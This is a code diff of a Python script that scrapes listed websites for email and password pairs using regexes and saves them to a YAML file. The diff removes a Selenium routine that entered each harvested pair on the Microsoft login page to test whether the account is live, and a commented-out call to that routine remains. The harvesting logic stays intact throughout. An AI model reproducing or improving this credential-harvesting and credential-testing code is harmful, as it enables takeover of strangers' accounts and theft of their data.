@@ -1,22 +1,16 @@
-from bs4 import BeautifulSoup
-from datetime import datetime
-from calendar import monthrange
-from selenium import webdriver
-from webdriver_manager.chrome import ChromeDriverManager
-from selenium.webdriver.common.by import By
-from selenium.webdriver.chrome.service import Service
-import requests
 import os
 import re
 import yaml
-import time
+import requests
+from bs4 import BeautifulSoup
+from datetime import datetime
+from calendar import monthrange
 
-option = webdriver.ChromeOptions()
-option.add_argument("start-maximized")
 
 launchTime = datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
 
-with open("settings.yml") as file: settings = yaml.safe_load(file)
+with open("settings.yml") as file: 
+    settings = yaml.safe_load(file)
 
 exceptions = settings["exceptions"]
 
@@ -30,45 +24,24 @@ releaseDateYears = releaseDate["years"]
 
 websitesList = settings["websites_list"]
 
-file.close()
-
 microsoftLoginUrl = "https://login.live.com/ppsecure/secure.srf"
 
 emailRegex = r"\S+@\S+\.\S+"
 passwordRegex = r"(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}"
 
 outputExample = {
-    "url": [],
-    "login": [],
-    "password": []
+    "url": {},
+    "login": {},
+    "password": {}
 }
+outputIndex = 1
 
-
+ 
 def progress_bar(current : int, total : int) -> None:
     percent = 100 * current/total
     round_percent = round(percent)
 
-    print(f"\r{round_percent*"█"+(100-round_percent)*"#"} [{percent:.2f}%]", end="\r")
-
-
-def microsoft_check(data : list[str]) -> bool:
-    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=option)
-    driver.get(microsoftLoginUrl)
-    time.sleep(2)
-    driver.find_element(By.ID,"i0116").send_keys(data[0])
-    time.sleep(1)
-    driver.find_element(By.XPATH,"//*[@id='idSIButton9']").click()
-    time.sleep(1)
-    driver.find_element(By.ID,"i0118").send_keys(data[1])
-    time.sleep(1)
-    driver.find_element(By.XPATH,"//*[@id='idSIButton9']").click()
-    time.sleep(1)
-    try:
-        if driver.find_element(By.ID,"i0118Error") or driver.find_element(By.ID,"idTD_Error") or driver.find_element(By.ID,"iSelectProofTitle"):
-            return False
-    except:
-        return True
-    driver.close()
+    print(f"\rParsing... {round_percent*"█"+(100-round_percent)*"#"} [{percent:.2f}%]", end="\r")
 
 
 def check_url(url : str) -> None:
@@ -88,24 +61,28 @@ def parse(url : str, soup : BeautifulSoup) -> None:
         login = re.findall(emailRegex, current)
         if login and login[0] not in exceptions:
             password = website_text[i+1].split()[-1] if re.findall(passwordRegex, website_text[i+1]) else website_text[i+2]
-            output(url, login[0], password)
+            write_output(url, login[0], password)
             break
 
 
-def output(url : str, login : str, password : str) -> None:
+def write_output(url : str, login : str, password : str) -> None:
+    global outputIndex
+
     with open(f"output-{launchTime}.yaml", "r") as file:
         outputData = yaml.safe_load(file)
-        outputData["url"].append(url)
-        outputData["login"].append(login)
-        outputData["password"].append(password)
+
+    outputData["url"][outputIndex] = url
+    outputData["login"][outputIndex] = login
+    outputData["password"][outputIndex] = password   
 
     with open(f"output-{launchTime}.yaml", "w") as file:
         yaml.dump(outputData, file)
-
+    
+    outputIndex += 1
 
 def main():
-    outputFile = open(f"output-{launchTime}.yaml", "w")
-    yaml.dump(outputExample, outputFile)
+    with open(f"output-{launchTime}.yaml", "w") as file:
+        yaml.dump(outputExample, file)
 
     counter = 1
     for month in range(1, 13):
@@ -126,7 +103,6 @@ def main():
             microsoft_check([microsoftData["login"][i], microsoftData["password"][i]])
     """
 
-    outputFile.close()
     os.rename(f"output-{launchTime}.yaml", f"output-{launchTime}-complete.yaml")
     print(f"\nSuccessfull complete! >> output-{launchTime}-complete.yaml")
 
